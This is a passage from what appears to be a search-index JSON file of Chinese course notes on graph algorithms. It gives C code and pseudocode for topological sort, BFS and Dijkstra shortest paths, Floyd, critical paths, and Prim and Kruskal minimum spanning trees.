TopOrder[] )\n{ /* \u5bf9Graph\u8fdb\u884c\u62d3\u6251\u6392\u5e8f,  TopOrder[]\u987a\u5e8f\u5b58\u50a8\u6392\u5e8f\u540e\u7684\u9876\u70b9\u4e0b\u6807 */\nint Indegree[MaxVertexNum], cnt;\nVertex V;\nPtrToAdjVNode W;\nQueue Q = CreateQueue( Graph-&gt;Nv );\n\n/* \u521d\u59cb\u5316Indegree[] */\nfor (V=0; V&lt;Graph-&gt;Nv; V++)\n      Indegree[V] = 0;\n\n/* \u904d\u5386\u56fe\uff0c\u5f97\u5230Indegree[] */\nfor (V=0; V&lt;Graph-&gt;Nv; V++)\n      for (W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next)\n            Indegree[W-&gt;AdjV] ++; /* \u5bf9\u6709\u5411\u8fb9&lt;V, W-&gt;AdjV&gt;\u7d2f\u8ba1\u7ec8\u70b9\u7684\u5165\u5ea6 */\n\n/* \u5c06\u6240\u6709\u5165\u5ea6\u4e3a0\u7684\u9876\u70b9\u5165\u5217 */\nfor (V=0; V&lt;Graph-&gt;Nv; V++)\n      if ( Indegree[V]==0 )\n            AddQ(Q, V);\n\n/* \u4e0b\u9762\u8fdb\u5165\u62d3\u6251\u6392\u5e8f */ \ncnt = 0; \nwhile( !IsEmpty(Q) ){\n      V = DeleteQ(Q); /* \u5f39\u51fa\u4e00\u4e2a\u5165\u5ea6\u4e3a 0 \u7684\u9876\u70b9 */\n      TopOrder[cnt ++] = V; /* \u5c06\u4e4b\u5b58\u4e3a\u7ed3\u679c\u5e8f\u5217\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20 */\n      /* \u5bf9V\u7684\u6bcf\u4e2a\u90bb\u63a5\u70b9W-&gt;AdjV */\n      for ( W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next )\n            if ( --Indegree[W-&gt;AdjV] == 0 )/* \u82e5\u5220\u9664V\u4f7f\u5f97W-&gt;AdjV\u5165\u5ea6\u4e3a0 */\n                AddQ(Q, W-&gt;AdjV); /* \u5219\u8be5\u9876\u70b9\u5165\u5217 */ \n} /* while\u7ed3\u675f*/\n\nif ( cnt != Graph-&gt;Nv )\n      return false; /* \u8bf4\u660e\u56fe\u4e2d\u6709\u56de\u8def, \u8fd4\u56de\u4e0d\u6210\u529f\u6807\u5fd7 */ \nelse\n      return true;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#_5", "title": "\u6700\u77ed\u8def\u7b97\u6cd5", "text": "<p>\u6700\u77ed\u8def\u5f84\u95ee\u9898\u7684\u62bd\u8c61</p> <p>\u5728\u7f51\u7edc\u4e2d\uff0c\u6c42\u4e24\u4e2a\u4e0d\u540c\u9876\u70b9\u4e4b\u95f4\u7684\u6240\u6709\u8def\u5f84\u4e2d\uff0c\u8fb9\u7684\u6743\u503c\u4e4b\u548c\u6700\u5c0f\u7684\u90a3\u4e00\u6761\u8def\u5f84\u3002\u8fd9\u6761\u8def\u5f84\u5373\u4e24\u70b9\u4e4b\u95f4\u7684\u6700\u77ed\u8def\u5f84 (Shortest Path) , \u7b2c\u4e00\u4e2a\u9876\u70b9\u4e3a\u6e90\u70b9 (Source) , \u6700\u540e\u4e00\u4e2a\u9876\u70b9\u4e3a\u7ec8\u70b9 (Destination)</p>"}, {"location": "Course/FDS/Lec04/#_6", "title": "\u95ee\u9898\u5206\u7c7b", "text": "<ol> <li>\u5355\u6e90\u6700\u77ed\u8def\u5f84: \u4ece\u56fa\u5b9a\u6e90\u70b9\u51fa\u53d1\uff0c\u6c42\u5176\u5230\u6240\u6709\u5176\u4ed6\u9876\u70b9\u7684\u6700\u77ed\u8def\u5f84<ol> <li>(\u6709\u5411) \u65e0\u6743\u56fe</li> <li>(\u6709\u5411) \u6709\u6743\u56fe</li> </ol> </li> <li>\u591a\u6e90\u6700\u77ed\u8def\u5f84: \u6c42\u4efb\u610f\u4e24\u9876\u70b9\u95f4\u7684\u6700\u77ed\u8def\u5f84</li> </ol>"}, {"location": "Course/FDS/Lec04/#_7", "title": "\u65e0\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def", "text": "<p>\u6309\u7167\u9012\u589e (\u9012\u51cf) \u7684\u987a\u5e8f\u627e\u51fa\u5230\u5404\u9876\u70b9\u7684\u6700\u77ed\u8def \u91c7\u7528 BFS (Breadth-first search)</p> <p>Implementation</p> <pre><code>Table[i].Dist = distance from s to vi  /* initialized to be Infinity except for s */\nTable[i].Known = 1 if vi is checked; or 0 if not\nTable[ i ].Path = for tracking the path   /* initialized to be 0 */\n</code></pre> <ol> <li>Normal: <pre><code>void Unweighted( Table T )\n{   \n    int  CurrDist;\n    Vertex  V, W;\n    for ( CurrDist = 0; CurrDist &lt; NumVertex; CurrDist ++ ) \n    {\n        for ( each vertex V )\n            if ( !T[ V ].Known &amp;&amp; T[ V ].Dist == CurrDist ) \n            {\n                T[ V ].Known = true;\n                for ( each W adjacent to V )\n                    if ( T[ W ].Dist == Infinity ) \n                    {\n                        T[ W ].Dist = CurrDist + 1;\n                        T[ W ].Path = V;\n                    } /* end-if Dist == Infinity */\n            } /* end-if !Known &amp;&amp; Dist == CurrDist */\n    }  /* end-for CurrDist */\n}\n</code></pre> <p>\\(T = O(|V|^2)\\) </p> </li> <li>Improvement: <pre><code>void Unweighted( Table T )\n{   /* T is initialized with the source vertex S given */\n    Queue  Q;\n    Vertex  V, W;\n    Q = CreateQueue (NumVertex );  \n    MakeEmpty( Q );\n    Enqueue( S, Q ); /* Enqueue the source vertex */\n    while ( !IsEmpty( Q ) ) \n    {\n        V = Dequeue( Q );\n        T[ V ].Known = true; /* not really necessary */\n        for ( each W adjacent to V )\n            if ( T[ W ].Dist == Infinity ) \n            {\n                T[ W ].Dist = T[ V ].Dist + 1;\n                T[ W ].Path = V;\n                Enqueue( W, Q );\n            } /* end-if Dist == Infinity */\n    } /* end-while */\n    DisposeQueue( Q ); /* free memory */\n}\n</code></pre> <p>\\(T = O(|V|+|E|)\\) </p> </li> </ol> \u90bb\u63a5\u8868\u5b58\u50a8 - \u65e0\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def\u7b97\u6cd5 <pre><code>/* dist[]\u548cpath[]\u5168\u90e8\u521d\u59cb\u5316\u4e3a-1 */\nvoid Unweighted ( LGraph Graph, int dist[], int path[], Vertex S )\n{\n    Queue Q;\n    Vertex V;\n    PtrToAdjVNode W;\n\n    Q = CreateQueue( Graph-&gt;Nv ); /* \u521b\u5efa\u7a7a\u961f\u5217, MaxSize\u4e3a\u5916\u90e8\u5b9a\u4e49\u7684\u5e38\u6570 */\n    dist[S] = 0; /* \u521d\u59cb\u5316\u6e90\u70b9 */\n    AddQ (Q, S);\n\n    while( !IsEmpty(Q) ){\n        V = DeleteQ(Q);\n        for ( W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next ) /* \u5bf9V\u7684\u6bcf\u4e2a\u90bb\u63a5\u70b9W-&gt;AdjV */\n            if ( dist[W-&gt;AdjV]==-1 ) { /* \u82e5W-&gt;AdjV\u672a\u88ab\u8bbf\u95ee\u8fc7 */\n                dist[W-&gt;AdjV] = dist[V]+1; /* W-&gt;AdjV\u5230S\u7684\u8ddd\u79bb\u66f4\u65b0 */\n                path[W-&gt;AdjV] = V; /* \u5c06V\u8bb0\u5f55\u5728S\u5230W-&gt;AdjV\u7684\u8def\u5f84\u4e0a */\n                AddQ(Q, W-&gt;AdjV);\n            }\n    } /* while\u7ed3\u675f*/\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#_8", "title": "\u6709\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def", "text": "<p>\u6309\u7167\u9012\u589e\u7684\u987a\u5e8f\u627e\u51fa\u5230\u5404\u9876\u70b9\u7684\u6700\u77ed\u8def</p>"}, {"location": "Course/FDS/Lec04/#dijkstra", "title": "Dijkstra \u7b97\u6cd5", "text": "<ul> <li>\u4ee4 S = {\u6e90\u70b9 s + \u5df2\u7ecf\u786e\u5b9a\u4e86\u6700\u77ed\u8def\u5f84\u7684\u9876\u70b9 v<sub>i</sub> }</li> <li>\u5bf9\u4efb\u4e00\u672a\u6536\u5f55\u7684\u9876\u70b9 v, \u5b9a\u4e49 dist[v] \u4e3a s \u5230 v \u7684\u6700\u77ed\u8def\u5f84\u957f\u5ea6\uff0c\u4f46\u8be5\u8def\u5f84\u4ec5\u7ecf\u8fc7 s \u4e2d\u7684\u9876\u70b9\u3002</li> <li>\u7531\u4e8e\u8def\u5f84\u6309\u7167\u9012\u589e\u987a\u5e8f\u751f\u6210<ul> <li>\u771f\u6b63\u7684\u6700\u77ed\u8def\u5fc5\u987b\u53ea\u7ecf\u8fc7 S \u4e2d\u7684\u9876\u70b9</li> <li>\u6bcf\u6b21\u4ece\u672a\u6536\u5f55\u7684\u9876\u70b9\u4e2d\u9009\u4e00\u4e2a dist \u6700\u5c0f\u7684\u6536\u5f55</li> <li>\u589e\u52a0\u4e00\u4e2a v \u8fdb\u5165 S\uff0c\u53ef\u80fd\u5f71\u54cd\u53e6\u4e00\u4e2a w \u7684 dist \u503c(dist[w] = min{dist[w], dist[v] + &lt; v, w &gt; \u7684\u6743\u91cd})</li> </ul> </li> </ul> <p>code</p> \u4f2a\u7801<pre><code>void Dijkstra(Table T)\n{\n      Vertex V, W;\n      for(;;)     /* O(|V|) */\n      {\n            V = smallest unknown distance vertex;\n            if(V == NotAVertex)\n                  break;\n            T[V].Known = true;\n            for(each W adjacent to V)\n                  if(!T[W].Known)\n                        if(T[V].Dist + Cvw &lt; T[W].Dist)\n                        {\n                            Decrease(T[W].Dist to T[V].Dist + Cvw);\n                            T[W].Path = V;\n                        }/* end-if update W */\n      }/* end-for(;;) */\n}\n/* \u4e0d\u80fd\u89e3\u51b3\u6709\u8d1f\u8fb9\u7684\u60c5\u51b5 */\n</code></pre> Dijkstra\u7b97\u6cd5\u7684\u58f0\u660e <pre><code>typedef int Vertex;\nstruct TableEntry\n{\n      List Header;      /* Adjacency list */\n      int Known;\n      DistType Dist;\n      Vertex Path;\n};\n/* Vertices are numbered from 0 */\n#define NotAVertex (-1)\ntypedef struct TableEntry Table[NumVertex];\n</code></pre> \u8868\u521d\u59cb\u5316\u4f8b\u7a0b <pre><code>void InitTable(Vertex Start, Graph G, Table T)\n{\n      int i;\n      ReadGraph(G, T);  /* Read graph somehow */\n      for(i = 0; i &lt; NumVertex; i++)\n      {\n            T[i].Known = False;\n            T[i].Dist = Infinity;\n            T[i].Path = NotAVertex;\n      }\n      T[Start].dist = 0;\n}\n</code></pre> \u663e\u793a\u5b9e\u9645\u6700\u77ed\u8def\u5f84\u7684\u4f8b\u7a0b <pre><code>/* Print shortest path to V after Dijkstra has run */\n/* Assume that the path exists */\nvoid PrintPath(Vertex V, Table T)\n{\n      if(T[V].Path != NotAVertex)\n      {\n            PrintPath(T[V].Path, T);\n            printf(\" to\");\n      }\n      printf(\"%v\", V);  // %v \u662f\u4f2a\u4ee3\u7801\n}\n</code></pre> <ul> <li>\u56e0\u4e3a\u5224\u5b9a\u6761\u4ef6 T[V].Dist + Cvw &lt; T[W].Dist\uff0cT[i].Dist \u8981\u521d\u59cb\u5316\u4e3a\u6b63\u65e0\u7a77</li> <li>\u4f18\u5316\u5982\u4e0b\uff1a<ul> <li>Implementation 1: \u76f4\u63a5\u626b\u63cf\u6240\u6709\u672a\u6536\u5f55\u9876\u70b9 \u2014\u2014 \\(O(|V|)\\) <ul> <li>\\(T = O(|V|^2 + |E|)\\) \u2014\u2014 \u5bf9\u4e8e\u7a20\u5bc6\u56fe\u6548\u679c\u597d</li> </ul> </li> <li>Implementation 2: \u5c06 dist \u5b58\u5728\u6700\u5c0f\u5806\u4e2d \u2014\u2014 \\(O(log|V|)\\) <ul> <li>\u66f4\u65b0 T[W].Dist \u7684\u503c \u2014\u2014 \\(O(log|V|)\\) </li> <li>$ T = O(|V|log|V| + |E|log|V|) = O(|E|log|V|) $  \u2014\u2014 \u5bf9\u7a00\u758f\u56fe\u6548\u679c\u597d(\u6307 V \u548c E \u4e00\u4e2a\u6570\u91cf\u7ea7)</li> </ul> </li> </ul> </li> </ul> \u90bb\u63a5\u77e9\u9635\u5b58\u50a8 - \u6709\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def\u7b97\u6cd5 <pre><code>Vertex FindMinDist( MGraph Graph, int dist[], int collected[] )\n{ \n    /* \u8fd4\u56de\u672a\u88ab\u6536\u5f55\u9876\u70b9\u4e2ddist\u6700\u5c0f\u8005 */\n    Vertex MinV, V;\n    int MinDist = INFINITY;\n\n    for (V=0; V&lt;Graph-&gt;Nv; V++) \n    {\n        if ( collected[V]==false &amp;&amp; dist[V]&lt;MinDist) \n        {\n            /* \u82e5V\u672a\u88ab\u6536\u5f55\uff0c\u4e14dist[V]\u66f4\u5c0f */\n            MinDist = dist[V]; /* \u66f4\u65b0\u6700\u5c0f\u8ddd\u79bb */\n            MinV = V; /* \u66f4\u65b0\u5bf9\u5e94\u9876\u70b9 */\n        }\n    }\n    if (MinDist &lt; INFINITY) /* \u82e5\u627e\u5230\u6700\u5c0fdist */\n        return MinV; /* \u8fd4\u56de\u5bf9\u5e94\u7684\u9876\u70b9\u4e0b\u6807 */\n    else \n        return ERROR;  /* \u82e5\u8fd9\u6837\u7684\u9876\u70b9\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de\u9519\u8bef\u6807\u8bb0 */\n}\n\nbool Dijkstra( MGraph Graph, int dist[], int path[], Vertex S )\n{\n    int collected[MaxVertexNum];\n    Vertex V, W;\n\n    /* \u521d\u59cb\u5316\uff1a\u6b64\u5904\u9ed8\u8ba4\u90bb\u63a5\u77e9\u9635\u4e2d\u4e0d\u5b58\u5728\u7684\u8fb9\u7528 INFINITY \u8868\u793a */\n    for ( V=0; V&lt;Graph-&gt;Nv; V++ ) {\n        dist[V] = Graph-&gt;G[S][V];\n        if ( dist[V] &lt; INFINITY )\n            path[V] = S;\n        else\n            path[V] = -1;\n        collected[V] = false;\n    }\n    /* \u5148\u5c06\u8d77\u70b9\u6536\u5165\u96c6\u5408 */\n    dist[S] = 0;\n    collected[S] = true;\n\n    while (1) {\n        /* V = \u672a\u88ab\u6536\u5f55\u9876\u70b9\u4e2d dist \u6700\u5c0f\u8005 */\n        V = FindMinDist( Graph, dist, collected );\n        if ( V == ERROR ) /* \u82e5\u8fd9\u6837\u7684V\u4e0d\u5b58\u5728 */\n            break;      /* \u7b97\u6cd5\u7ed3\u675f */\n        collected[V] = true;  /* \u6536\u5f55V */\n        for( W=0; W&lt;Graph-&gt;Nv; W++ ) /* \u5bf9\u56fe\u4e2d\u7684\u6bcf\u4e2a\u9876\u70b9W */\n            /* \u82e5W\u662fV\u7684\u90bb\u63a5\u70b9\u5e76\u4e14\u672a\u88ab\u6536\u5f55 */\n            if ( collected[W]==false &amp;&amp; Graph-&gt;G[V][W]&lt;INFINITY ) \n            {\n                if ( Graph-&gt;G[V][W]&lt;0 ) /* \u82e5\u6709\u8d1f\u8fb9 */\n                    return false; /* \u4e0d\u80fd\u6b63\u786e\u89e3\u51b3\uff0c\u8fd4\u56de\u9519\u8bef\u6807\u8bb0 */\n                /* \u82e5\u6536\u5f55V\u4f7f\u5f97dist[W]\u53d8\u5c0f */\n                if ( dist[V]+Graph-&gt;G[V][W] &lt; dist[W] ) {\n                    dist[W] = dist[V]+Graph-&gt;G[V][W]; /* \u66f4\u65b0dist[W] */\n                    path[W] = V; /* \u66f4\u65b0S\u5230W\u7684\u8def\u5f84 */\n                }\n            }\n    } /* while\u7ed3\u675f*/\n    return true; /* \u7b97\u6cd5\u6267\u884c\u5b8c\u6bd5\uff0c\u8fd4\u56de\u6b63\u786e\u6807\u8bb0 */\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#_9", "title": "\u5e26\u8d1f\u6743\u56fe", "text": "<p>\u65f6\u95f4\u590d\u6742\u5ea6 \\(T = O(|V| \\times |E|)\\) <pre><code>void  WeightedNegative( Table T )\n{   \n    Queue  Q;\n    Vertex  V, W;\n    Q = CreateQueue (NumVertex );  \n    MakeEmpty( Q );\n    Enqueue( S, Q ); /* Enqueue the source vertex */\n    while ( !IsEmpty( Q ) ) \n    {\n        V = Dequeue( Q );   /* each vertex can dequeue at most |V| times */\n        for ( each W adjacent to V )\n            if ( T[ V ].Dist + Cvw &lt; T[ W ].Dist )  /* no longer once per edge */\n            {\n                T[ W ].Dist = T[ V ].Dist + Cvw;\n                T[ W ].Path = V;\n                if ( W is not already in Q )\n                    Enqueue( W, Q );\n            } /* end-if update */\n    } /* end-while */\n    DisposeQueue( Q ); /* free memory */\n}\n/* negative-cost cycle will cause indefinite loop */\n</code></pre></p>"}, {"location": "Course/FDS/Lec04/#acyclic-graph", "title": "\u65e0\u73af\u56fe | Acyclic Graph", "text": "<p>\u6b64\u90e8\u5206\u4e3b\u8981\u662f\u5176\u5728 AOE (Activity On Edge) \u7f51\u7edc\u7684\u5e94\u7528  \u4e00\u822c\u7528\u4e8e\u5b89\u6392\u9879\u76ee\u7684\u5de5\u5e8f</p> <ul> <li>\u6bcf\u4e2a\u7ed3\u70b9\u5b58\u50a8\u4e00\u4e2a\u6700\u65e9\u5b8c\u6210\u65f6\u95f4\u548c\u6700\u665a\u5b8c\u6210\u65f6\u95f4</li> <li>\u6bcf\u6761\u8fb9\u5b58\u5728\u4e00\u4e2a\u6301\u7eed\u65f6\u95f4 (\u8fb9\u6743 C ) \u548c\u4e00\u4e2a\u677e\u5f1b\u65f6\u95f4</li> <li>\u76f8\u5173\u8ba1\u7b97:<ul> <li>EC (earliest completion): \u6700\u65e9\u5b8c\u6210\u65f6\u95f4\uff0c\u4ece\u524d\u5f80\u540e\u8ba1\u7b97</li> <li>LC (latest completion): \u6700\u665a\u5b8c\u6210\u65f6\u95f4\uff0c\u7528\u9700\u8981\u6700\u957f\u7684\u65f6\u95f4\u4ece\u540e\u5411\u524d\u4f9d\u6b21\u51cf\u53bb</li> <li>Slack Time: \u677e\u5f1b\u65f6\u95f4 | \u673a\u52a8\u65f6\u95f4\uff0c\u6700\u65e9\u5b8c\u6210\u7684\u65f6\u95f4\u548c\u8981\u6c42\u7684\u6700\u665a\u5b8c\u6210\u7684\u65f6\u95f4\u4e4b\u95f4\u7684\u65f6\u95f4</li> <li>Critical Path: \u5173\u952e\u8def\u5f84\uff0c\u53ef\u80fd\u4e0d\u6b62\u4e00\u6761\u4f46\u627e\u51fa\u4e00\u6761\u8def\u5f84\u4e0a\u6240\u6709\u70b9\u90fd\u662f\u5173\u952e\u70b9\uff08\u677e\u5f1b\u65f6\u95f4\u4e3a 0\uff09\u7684\u5c31\u884c</li> </ul> </li> </ul> Quote <p> \u56fe\u7247\u6458\u81ea\u8bfe\u7a0bPPT  CSDN-AOE\u7f51\u7edc(\u5927\u529b\u6d77\u68e0\u7684\u535a\u5ba2)</p> \u62d3\u5c55 <p>\u591a\u6e90\u6700\u77ed\u8def</p> <p>\u7b97\u6cd5\u2014\u2014(\u76f4\u63a5\u5c06\u5355\u6e90\u6700\u77ed\u8def\u7b97\u6cd5\u8c03\u7528 |V| \u904d or Floyd \u7b97\u6cd5)</p> Floyd \u7b97\u6cd5<pre><code>void Floyd()\n{\n    for( i = 0; i &lt; N; i++)\n    {\n        for( j = 0; j &lt; N; j++)\n        {\n            D[i][j] = G[i][j];\n            path[i][j] = -1;\n            /*path\u7528\u4e8e\u8bb0\u5f55\u8def\u5f84*/\n        }\n    }\n    for( k = 0; k &lt; N; k++)\n    {\n        for( i = 0; i &lt; N; i++)\n        {\n            for( j = 0; j &lt; N; j++)\n            {\n                if( D[i][k] + D[k][j] &lt; D[i][j])\n                {\n                    D[i][j] = D[i][k] + D[k][j];\n                    path[i][j] = k;\n                    /*\u5982\u679c\u5c06i\u5230j\u7684\u6700\u77ed\u8def\u5f84*/\n                }\n            }\n        }\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#minimum-spanning-tree", "title": "\u6700\u5c0f\u751f\u6210\u6811 | Minimum Spanning Tree", "text": "<ul> <li>\u662f\u4e00\u68f5\u6811\uff0c\u4e14\uff1a<ul> <li>\u65e0\u56de\u8def</li> <li>\u8fde\u901a\u7684</li> <li>|V|\u4e2a\u9876\u70b9\u4e00\u5b9a\u6709|V| -1\u6761\u8fb9</li> </ul> </li> <li>\u662f\u751f\u6210\u6811<ul> <li>\u5305\u542b\u5168\u90e8\u9876\u70b9</li> <li>|V| -1\u6761\u8fb9\u90fd\u5728\u56fe\u4e2d</li> </ul> </li> <li>\u8fb9\u7684\u6743\u91cd\u548c\u6700\u5c0f</li> </ul> <p>\u5411\u751f\u6210\u6811\u4e2d\u4efb\u52a0\u4e00\u6761\u8fb9\u90fd\u4e00\u5b9a\u6784\u6210\u56de\u8def \u6700\u5c0f\u751f\u6210\u6811\u5b58\u5728 \\(\\Leftrightarrow\\) \u56fe\u8fde\u901a</p>"}, {"location": "Course/FDS/Lec04/#prim", "title": "Prim \u7b97\u6cd5", "text": "<p>\u7a20\u5bc6\u56fe\u4e00\u822c\u7528\u6b64\u7b97\u6cd5\uff0c\u6bcf\u6b21\u5bfb\u627e\u7684\u662f\u548c\u5df2\u7ecf\u6536\u7f57\u8fdb\u6700\u5c0f\u751f\u6210\u6811\u6240\u6709\u9876\u70b9\u76f8\u90bb\u7684\u8fb9 \u7c7b\u4f3c Dijkstra \u7b97\u6cd5, \\(T = O( |V| ^2 )\\) </p> code \u90bb\u63a5\u77e9\u9635\u5b58\u50a8<pre><code>/* \u90bb\u63a5\u77e9\u9635\u5b58\u50a8 - Prim\u6700\u5c0f\u751f\u6210\u6811\u7b97\u6cd5 */\n\nVertex FindMinDist( MGraph Graph, WeightType dist[] )\n{ /* \u8fd4\u56de\u672a\u88ab\u6536\u5f55\u9876\u70b9\u4e2ddist\u6700\u5c0f\u8005 */\n    Vertex MinV, V;\n    WeightType MinDist = INFINITY;\n\n    for (V=0; V&lt;Graph-&gt;Nv; V++) \n    {\n        if ( dist[V]!=0 &amp;&amp; dist[V]&lt;MinDist) \n        {\n            /* \u82e5V\u672a\u88ab\u6536\u5f55\uff0c\u4e14dist[V]\u66f4\u5c0f */\n            MinDist = dist[V]; /* \u66f4\u65b0\u6700\u5c0f\u8ddd\u79bb */\n            MinV = V; /* \u66f4\u65b0\u5bf9\u5e94\u9876\u70b9 */\n        }\n    }\n    if (MinDist &lt; INFINITY) /* \u82e5\u627e\u5230\u6700\u5c0fdist */\n        return MinV; /* \u8fd4\u56de\u5bf9\u5e94\u7684\u9876\u70b9\u4e0b\u6807 */\n    else \n        return ERROR;  /* \u82e5\u8fd9\u6837\u7684\u9876\u70b9\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de-1\u4f5c\u4e3a\u6807\u8bb0 */\n}\n\nint Prim( MGraph Graph, LGraph MST )\n{ \n    /* \u5c06\u6700\u5c0f\u751f\u6210\u6811\u4fdd\u5b58\u4e3a\u90bb\u63a5\u8868\u5b58\u50a8\u7684\u56fe MST\uff0c\u8fd4\u56de\u6700\u5c0f\u6743\u91cd\u548c */\n    WeightType dist[MaxVertexNum], TotalWeight;\n    Vertex parent[MaxVertexNum], V, W;\n    int VCount;\n    Edge E;\n\n    /* \u521d\u59cb\u5316\u3002\u9ed8\u8ba4\u521d\u59cb\u70b9\u4e0b\u6807\u662f0 */\n    for (V=0; V&lt;Graph-&gt;Nv; V++) {\n        /* \u8fd9\u91cc\u5047\u8bbe\u82e5V\u5230W\u6ca1\u6709\u76f4\u63a5\u7684\u8fb9\uff0c\u5219Graph-&gt;G[V][W]\u5b9a\u4e49\u4e3aINFINITY */\n        dist[V] = Graph-&gt;G[0][V];\n        parent[V] = 0; /* \u6682\u4e14\u5b9a\u4e49\u6240\u6709\u9876\u70b9\u7684\u7236\u7ed3\u70b9\u90fd\u662f\u521d\u59cb\u70b90 */ \n    }\n    TotalWeight = 0; /* \u521d\u59cb\u5316\u6743\u91cd\u548c     */\n    VCount = 0;      /* \u521d\u59cb\u5316\u6536\u5f55\u7684\u9876\u70b9\u6570 */\n    /* \u521b\u5efa\u5305\u542b\u6240\u6709\u9876\u70b9\u4f46\u6ca1\u6709\u8fb9\u7684\u56fe\u3002\u6ce8\u610f\u7528\u90bb\u63a5\u8868\u7248\u672c */\n    MST = CreateGraph(Graph-&gt;Nv);\n    E = (Edge)malloc( sizeof(struct ENode) ); /* \u5efa\u7acb\u7a7a\u7684\u8fb9\u7ed3\u70b9 */\n\n    /* \u5c06\u521d\u59cb\u70b90\u6536\u5f55\u8fdbMST */\n    dist[0] = 0;\n    VCount ++;\n    parent[0] = -1; /* \u5f53\u524d\u6811\u6839\u662f0 */\n\n    while (1) {\n        V = FindMinDist( Graph, dist );\n        /* V = \u672a\u88ab\u6536\u5f55\u9876\u70b9\u4e2ddist\u6700\u5c0f\u8005 */\n        if ( V==ERROR ) /* \u82e5\u8fd9\u6837\u7684V\u4e0d\u5b58\u5728 */\n            break;   /* \u7b97\u6cd5\u7ed3\u675f */\n\n        /* \u5c06V\u53ca\u76f8\u5e94\u7684\u8fb9&lt;parent[V], V&gt;\u6536\u5f55\u8fdbMST */\n        E-&gt;V1 = parent[V];\n        E-&gt;V2 = V;\n        E-&gt;Weight = dist[V];\n        InsertEdge( MST, E );\n        TotalWeight += dist[V];\n        dist[V] = 0;\n        VCount++;\n\n        for( W=0; W&lt;Graph-&gt;Nv; W++ ) /* \u5bf9\u56fe\u4e2d\u7684\u6bcf\u4e2a\u9876\u70b9W */\n            if ( dist[W]!=0 &amp;&amp; Graph-&gt;G[V][W]&lt;INFINITY ) {\n            /* \u82e5W\u662fV\u7684\u90bb\u63a5\u70b9\u5e76\u4e14\u672a\u88ab\u6536\u5f55 */\n                if ( Graph-&gt;G[V][W] &lt; dist[W] ) {\n                /* \u82e5\u6536\u5f55V\u4f7f\u5f97dist[W]\u53d8\u5c0f */\n                    dist[W] = Graph-&gt;G[V][W]; /* \u66f4\u65b0dist[W] */\n                    parent[W] = V; /* \u66f4\u65b0\u6811 */\n                }\n            }\n    } /* while\u7ed3\u675f*/\n    if ( VCount &lt; Graph-&gt;Nv ) /* MST\u4e2d\u6536\u7684\u9876\u70b9\u4e0d\u5230|V|\u4e2a */\n    TotalWeight = ERROR;\n    return TotalWeight;   /* \u7b97\u6cd5\u6267\u884c\u5b8c\u6bd5\uff0c\u8fd4\u56de\u6700\u5c0f\u6743\u91cd\u548c\u6216\u9519\u8bef\u6807\u8bb0 */\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#kruskal", "title": "Kruskal \u7b97\u6cd5", "text": "<p>\u5c06\u6bcf\u4e2a\u9876\u70b9\u90fd\u770b\u4f5c\u4e00\u68f5\u6811\uff0c\u6536\u96c6\u7684\u662f\u8fb9\uff0c\u5982\u679c\u8fd9\u6761\u8fb9\u6536\u5165\u6784\u6210\u56de\u8def\u5c31\u4e0d\u6536\u5165\uff0c\u5982\u679c\u4e0d\u6784\u6210\u5c31\u6536\u5165\uff08\u4ece\u8fb9\u6743\u91cd\u6700\u5c0f\u5f00\u59cb\u6536\uff0c\u6536\u5230\u8fb9\u7684\u6570\u91cf\u4e3a|V|-1\u4e3a\u6b62\uff09</p> <ul> <li>\u7a00\u758f\u56fe\u4e00\u822c\u7528\u6b64\u7b97\u6cd5\uff08\u8fb9\u7684\u6570\u91cf\u548c\u9876\u70b9\u6570\u91cf\u7ea7\u5dee\u4e0d\u591a\uff09</li> <li>\\(T = O(|E|log|E|)\\) </li> </ul> \u4f2a\u7801<pre><code>void Kruskal ( Graph G )\n{   \n    T = { } ;\n    while ( T contains less than |V| \uf02d1 edges &amp;&amp; E is not empty ) \n    {\n        choose a least cost edge (v, w) from E ;    /* DeleteMin */\n        delete (v, w) from E ;\n        if  ( (v, w) does not create a cycle in T )     \n            add (v, w) to T ;   /* Union / Find */\n        else\n            discard (v, w) ;\n    }\n    if( T contains fewer than |V| - 1 edges )\n        Error ( \u201cNo spanning tree\u201d ) ;}\n</code></pre> code \u90bb\u63a5\u77e9\u9635\u5b58\u50a8<pre><code>/* \u90bb\u63a5\u8868\u5b58\u50a8 - Kruskal\u6700\u5c0f\u751f\u6210\u6811\u7b97\u6cd5 */\n\n/*-------------------- \u9876\u70b9\u5e76\u67e5\u96c6\u5b9a\u4e49 --------------------*/\ntypedef Vertex ElementType; /* \u9ed8\u8ba4\u5143\u7d20\u53ef\u4ee5\u7528\u975e\u8d1f\u6574\u6570\u8868\u793a */\ntypedef Vertex SetName;     /* \u9ed8\u8ba4\u7528\u6839\u7ed3\u70b9\u7684\u4e0b\u6807\u4f5c\u4e3a\u96c6\u5408\u540d\u79f0 */\ntypedef ElementType SetType[MaxVertexNum]; /* \u5047\u8bbe\u96c6\u5408\u5143\u7d20\u4e0b\u6807\u4ece0\u5f00\u59cb */\n\nvoid InitializeVSet( SetType S, int N )\n{ /* \u521d\u59cb\u5316\u5e76\u67e5\u96c6 */\n    ElementType X;\n\n    for ( X=0; X&lt;N; X++ ) S[X] = -1;\n}\n\nvoid Union( SetType S, SetName Root1, SetName Root2 )\n{ /* \u8fd9\u91cc\u9ed8\u8ba4Root1\u548cRoot2\u662f\u4e0d\u540c\u96c6\u5408\u7684\u6839\u7ed3\u70b9 */\n    /* \u4fdd\u8bc1\u5c0f\u96c6\u5408\u5e76\u5165\u5927\u96c6\u5408 */\n    if ( S[Root2] &lt; S[Root1] ) { /* \u5982\u679c\u96c6\u54082\u6bd4\u8f83\u5927 */\n        S[Root2] += S[Root1];     /* \u96c6\u54081\u5e76\u5165\u96c6\u54082  */\n        S[Root1] = Root2;\n    }\n    else {                         /* \u5982\u679c\u96c6\u54081\u6bd4\u8f83\u5927 */\n        